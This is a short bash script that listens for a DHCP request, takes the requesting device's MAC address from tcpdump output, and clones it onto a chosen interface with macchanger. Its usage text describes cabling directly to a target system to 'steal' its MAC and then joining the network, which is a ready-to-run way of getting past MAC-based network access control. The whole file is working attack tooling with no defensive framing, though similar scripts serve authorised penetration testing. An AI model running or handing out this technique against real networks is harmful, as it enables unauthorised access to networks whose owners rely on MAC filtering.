#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <interface>"
	echo "$0 will listen for a DHCP request packet then clone the sending mac address to the specified interface."
	echo ""
	echo "The best use is to connect to a system with a cross-over cable to 'steal' the mac then connect to the network."
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

INTERFACE=$1

echo "[`date`] Listening for DHCP requests on $INTERFACE"

echo "[`date`] Waiting for target to DHCP Request to get mac address..."

# Now wait for request to get past IP and current mac
TCPDUMP=`tcpdump -vv -n -c 1 -i $INTERFACE -s 0 port bootps 2>&1`

COMPMAC=`echo "$TCPDUMP" | grep -Eio "Client\-Ethernet\-Address [0-9a-zA-Z]{2,2}:[0-9a-zA-Z]{2,2}:[0-9a-zA-Z]{2,2}:[0-9a-zA-Z]{2,2}:[0-9a-zA-Z]{2,2}:[0-9a-zA-Z]{2,2}" | sed "s|Client-Ethernet-Address ||" | head -1`
if [ ${#COMPMAC} -eq 0 ]; then
	echo "ERROR: Unable to get target's mac address."
	exit 10
fi

echo "Found target mac address: $COMPMAC"

macchanger -m $COMPMAC $INTERFACE 

echo "[`date`] $INTERFACE set to $COMPMAC"
echo "Use macchanger -p $INTERFACE to reset it (or reboot)"

